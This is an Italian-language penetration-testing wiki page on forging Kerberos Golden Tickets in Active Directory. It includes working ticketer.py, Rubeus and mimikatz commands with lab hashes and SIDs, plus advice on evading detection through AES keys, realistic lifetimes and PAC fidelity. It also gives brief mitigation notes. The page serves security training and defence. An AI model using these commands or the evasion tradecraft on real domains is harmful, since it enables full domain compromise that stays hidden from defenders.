# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Un **Golden Ticket** attack consiste nella **creazione di un Ticket Granting Ticket (TGT) legittimo che impersona qualsiasi utente** tramite l'uso dell'**hash NTLM dell'account krbtgt di Active Directory (AD)**. Questa tecnica è particolarmente vantaggiosa perché **consente l'accesso a qualsiasi servizio o macchina** all'interno del dominio come utente impersonato. È fondamentale ricordare che le **credenziali dell'account krbtgt non vengono mai aggiornate automaticamente**.

Per **ottenere l'hash NTLM** dell'account krbtgt, si possono usare vari metodi. Può essere estratto dal processo **Local Security Authority Subsystem Service (LSASS)** oppure dal file **NT Directory Services (NTDS.dit)** situato su qualsiasi Domain Controller (DC) del dominio. Inoltre, l'**esecuzione di un attacco DCsync** è un'altra strategia per ottenere questo hash NTLM, che può essere eseguito usando strumenti come il modulo **lsadump::dcsync** in Mimikatz o lo script **secretsdump.py** di Impacket. È importante sottolineare che, per svolgere queste operazioni, **sono in genere richiesti privilegi di domain admin o un livello di accesso simile**.

Sebbene l'hash NTLM sia un metodo valido per questo scopo, è **fortemente raccomandato** **forgiare ticket usando le chiavi Kerberos Advanced Encryption Standard (AES) (AES128 e AES256)** per ragioni di operational security. Questo è ancora più importante nei domini moderni perché l'**uso di RC4 viene progressivamente abbandonato** e risalta molto di più nella telemetria Kerberos.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Note moderne sulla creazione dei ticket

Quando possibile, **interroga prima LDAP e SYSVOL** e poi forgia il ticket usando la vera policy del dominio e i valori PAC dell'utente invece di inventarli manualmente:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` chiede al DC l'utente, il gruppo, i dati NetBIOS e i dati di policy usati per costruire un PAC più realistico.
- `/printcmd` stampa una command line offline contenente i campi PAC recuperati, utile se in seguito vuoi forgiare lo stesso ticket senza toccare di nuovo LDAP.
- `/extendedupndns` aggiunge i più recenti elementi PAC `UpnDns`, contenenti `samAccountName` e SID dell'account.
- `/oldpac` rimuove i più recenti buffer PAC `Requestor` e `Attributes`; è utile soprattutto per test di compatibilità con ambienti più vecchi, non per default tradecraft.

Da Linux, le versioni recenti di Impacket supportano anche l'aggiunta delle più recenti strutture PAC e l'impostazione di un periodo di validità realistico:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` è in **ore**. Il valore predefinito è **10 anni**, il che è rumoroso.
- `-extra-pac` aggiunge le nuove informazioni PAC `UPN_DNS`.
- `-old-pac` forza il layout legacy del PAC.
- `-extra-sid` è utile quando il PAC necessita di SID aggiuntivi (per esempio, in scenari di escalation child-to-parent, che sono trattati in [SID-History Injection](sid-history-injection.md)).

**Una volta** che hai il **golden Ticket iniettato**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi potresti usare **psexec** o **wmiexec** per ottenere una shell (sembra che non sia possibile ottenere una shell tramite winrm).

### Bypassing common detections

I modi più frequenti per rilevare un golden ticket sono **ispezionando il traffico Kerberos** sulla rete. Per impostazione predefinita, Mimikatz **firma il TGT per 10 anni**, cosa che risulterà anomala nelle successive richieste TGS effettuate con esso.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Usa i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di inizio, la durata e il numero massimo di rinnovi (tutti in minuti).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Purtroppo, la durata di vita del TGT non è registrata nei 4769, quindi non troverai questa informazione nei Windows event logs. Tuttavia, ciò che puoi correlare è **vedere 4769 senza un precedente 4768**. **Non è possibile richiedere un TGS senza un TGT**, e se non c’è alcun record che un TGT sia stato emesso, possiamo dedurre che sia stato forgiato offline.

Nelle **build più recenti di Windows**, gli Event IDs **4768** e **4769** espongono anche una telemetria molto migliore sul **tipo di cifratura**. Un TGT/TGS forgiato usando **RC4 (`0x17`)** in un dominio in cui `krbtgt`, client e servizi hanno già chiavi AES è molto più facile da individuare rispetto a qualche anno fa. Questo è un altro motivo per preferire **Golden Tickets basati su AES** e per far corrispondere il più possibile la normale Kerberos policy del dominio.

Un altro problema di OPSEC è la **fedeltà del PAC**. Ticket con membership di gruppi impossibili, buffer PAC più recenti mancanti, o metadati dell’account che non corrispondono a LDAP sono più facili da rilevare quando i defender validano il contenuto del PAC contro i dati di AD. Se ti serve un TGT che sembri davvero emesso da un DC, consulta:

{{#ref}}
diamond-ticket.md
{{#endref}}

Ci sono anche **limiti ambientali** alla persistenza. L’account `krbtgt` mantiene una **password history di 2**, quindi un TGT forgiato può restare valido attraverso il **primo** reset di `krbtgt` se è stato firmato con la chiave precedente. Per questo i defender invalidano i Golden Tickets **resettando `krbtgt` due volte** e aspettando almeno la massima durata del ticket del dominio tra un reset e l’altro.

Per **bypassare questa detection** controlla i diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Altri piccoli trucchi che i defender possono usare sono **alert su 4769 per utenti sensibili** come l’account amministratore di dominio predefinito e alert sull’**uso di RC4 per `krbtgt`** in domini che normalmente emettono ticket AES.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
